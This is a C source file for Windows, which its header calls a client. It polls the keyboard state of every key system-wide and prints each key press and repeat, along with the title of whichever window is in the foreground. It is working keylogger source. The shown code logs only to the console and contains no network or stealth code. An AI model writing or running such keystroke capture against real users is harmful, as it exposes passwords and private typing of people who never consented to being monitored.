// Client for Windows that capture the keypresses and title of the current window

#include <windows.h>
#include <stdio.h>
#include <string.h>

const char* getKeyName(int key) {
    switch (key) {
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "[CTRL]";
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "[SHIFT]";
        case VK_LMENU:
        case VK_RMENU:
            return "[ALT]";
        case VK_CAPITAL:
            return "[CAPSLOCK]";
        case VK_NUMLOCK:
            return "[NUMLOCK]";
        case VK_SCROLL:
            return "[SCROLLLOCK]";
        case VK_ESCAPE:
            return "[ESC]";
        case VK_TAB:
            return "[TAB]";
        case VK_RETURN:
            return "[ENTER]";
        case VK_BACK:
            return "[BACKSPACE]";
        case VK_SPACE:
            return "[SPACE]";
        case VK_PRIOR:
            return "[PAGE UP]";
        case VK_NEXT:
            return "[PAGE DOWN]";
        case VK_END:
            return "[END]";
        case VK_HOME:
            return "[HOME]";
        case VK_LEFT:
            return "[LEFT ARROW]";
        case VK_UP:
            return "[UP ARROW]";
        case VK_RIGHT:
            return "[RIGHT ARROW]";
        case VK_DOWN:
            return "[DOWN ARROW]";
        case VK_INSERT:
            return "[INSERT]";
        case VK_DELETE:
            return "[DELETE]";
        default:
            return NULL; // printable characters or unknown keys
    }
}

int main() {
    char lastWindowTitle[256] = "";

    int repeatDelay, repeatRate;
    SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &repeatDelay, 0);
    SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &repeatRate, 0);

    int delayMs = (repeatDelay + 1) * 250;
    int repeatInterval = 1000 / (repeatRate + 1);

    printf("Repeat Delay: %d ms, Repeat Rate: %d chars/sec\n", delayMs, 1000 / repeatInterval);

    DWORD lastPressTime[256] = { 0 };
    DWORD firstRepeatTime[256] = { 0 };
    BOOL isRepeating[256] = { 0 };

    while (1) {
        HWND hwnd = GetForegroundWindow(); // Get handle to the current foreground window
        if (hwnd != NULL) {
            char windowTitle[256];
            int length = GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
            
            if (length > 0) {
                if (strcmp(lastWindowTitle, windowTitle) != 0) {
                    printf("Current window title: %s\n", windowTitle);
                    strcpy(lastWindowTitle, windowTitle);
                }
            } else {
                printf("Unable to retrieve window title.\n");
            }
        }

        for (int i = 0; i < 256; i++) {
            // 0x8000 -> pressed
            if (GetAsyncKeyState(i) & 0x8000) {
                DWORD currentTime = GetTickCount();

                if (lastPressTime[i] == 0) {
                    const char* keyName = getKeyName(i);
                    if (keyName != NULL) {
                        printf("Key Pressed: %s\n", keyName);
                    } else {
                        if (i >= 0x30 && i <= 0x5A) {
                            printf("Key Pressed: %c\n", (char)i);
                        }
                    }

                    lastPressTime[i] = currentTime;
                    firstRepeatTime[i] = currentTime;  // set time for first repeat
                    isRepeating[i] = TRUE;  // repeat after first press
                }
                else if (isRepeating[i] && currentTime - firstRepeatTime[i] >= delayMs) {
                    if (currentTime - lastPressTime[i] >= repeatInterval) {
                        const char* keyName = getKeyName(i);
                        if (keyName != NULL) {
                            printf("Key Repeated: %s\n", keyName);
                        } else {
                            if (i >= 0x30 && i <= 0x5A) {
                                printf("Key Repeated: %c\n", (char)i);
                            }
                        }

                        lastPressTime[i] = currentTime;
                    }
                }
            } else {
                if (isRepeating[i]) {
                    // reset the state to allow the key to be pressed again
                    lastPressTime[i] = 0;  // reset time of the last press
                    isRepeating[i] = FALSE;  // stop repeating when key is released
                }
            }
        }

        Sleep(1);
    }

    return 0;
}
